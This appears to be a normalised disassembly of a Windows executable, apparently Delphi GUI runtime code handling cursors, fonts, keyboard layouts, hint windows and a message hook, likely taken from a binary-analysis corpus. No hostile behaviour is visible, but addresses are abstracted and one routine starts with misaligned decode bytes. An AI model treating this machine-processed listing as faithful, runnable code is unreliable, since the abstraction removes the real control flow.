mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45e49c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e378
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e378
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e378
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_45de18
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_40321c
mov eax [ ebp + 0x88 ]
call sub_40321c
mov eax [ ebp + 0x84 ]
call sub_40321c
mov eax [ ebp + 0x54 ]
call sub_40321c
mov eax [ ebp + 0x50 ]
call sub_40321c
mov eax [ ebp + 0x4c ]
call sub_40321c
mov eax [ ebp + 0x30 ]
call sub_40321c
mov eax [ ebp + 0x34 ]
call sub_40321c
mov eax [ ebp + 0x7c ]
call sub_40321c
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_40321c
mov eax ebp
call sub_45e0d8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41fb88
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403590
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_41a19c
call sub_40321c
inc edi
dec esi
jne r-xdata
sub_45df90
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45dfdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a040
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a040
mov eax [ rw-data ]
call sub_460e10
sub_45e014
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a2e0
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a2e0
mov eax [ rw-data ]
call sub_460e10
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44867c
sub_45e07c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45e134
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45e0d8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4027ac
mov ebx esi
test ebx ebx
jne r-xdata
sub_45e134
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_40278c
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45e15c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e307
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e30e
lea eax [ ebp - 0x260 ]
call sub_403f6c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f6c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41bd2c
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408ed8
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44bde0
test al al
je r-xdata
xor eax eax
push ebp
push sub_45e2c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041dc
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041dc
sub_45e378
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_460c80
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460a34
mov dl 0x1
mov eax [ rw-data ]
call sub_460a34
sub_45e3e4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45e40c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45e3e4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406ce8
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c68
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45e49c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45e5e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460a34
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423074
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423074
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423158
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423074
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423074
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423074
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_460a34
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_422eb8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_422eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e5e8
cmp [ rw-data ] 0x0
je r-xdata
sub_45e620
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45e680
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45e7bc ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45e830
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45df88
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41a19c
mov dl [ ebp - 0x1 ]
call sub_45e680
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45df74
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a040
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41a218
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_41a19c
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45e620
test al al
je r-xdata
inc esi
sub_45e97c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45df88
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45df74
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45e9d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45e97c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45ea4e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45e830
pop ecx
push ebp
mov al 0x2
call sub_45e830
pop ecx
push ebp
mov al 0x3
call sub_45e830
pop ecx
push ebp
mov al 0x4
call sub_45e830
pop ecx
push ebp
mov al 0x5
call sub_45e830
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_45ea5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e5f0
xor eax eax
push ebp
push sub_45ead5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45e9d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45e5f8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45eaf0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f6c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fc0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45eb48
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_45eb79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46103c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45eb9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43f11c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4610b8
sub_45ebf8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460140
sub_45ec3c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45ebf8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45eb9c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45ecb0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45ed0c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45ed3c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45ed64
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45ed0c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45ed3c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45ed3c
sub_45eda4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fb3c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460524
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4299d8
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_429da8
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_460cbc
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c6d4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46071c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c6fc
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4088cc
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041dc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_460e98
mov eax ebx
call sub_46185c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45f0ac
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_45ef8d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_46186c
mov [ esp + 0x4 ] esi
mov [ esp ] sub_460524
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46071c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4610b8
xor edx edx
mov eax esi
call sub_460a34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
push esi
push sub_45f4e0
mov eax esi
call sub_460310
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
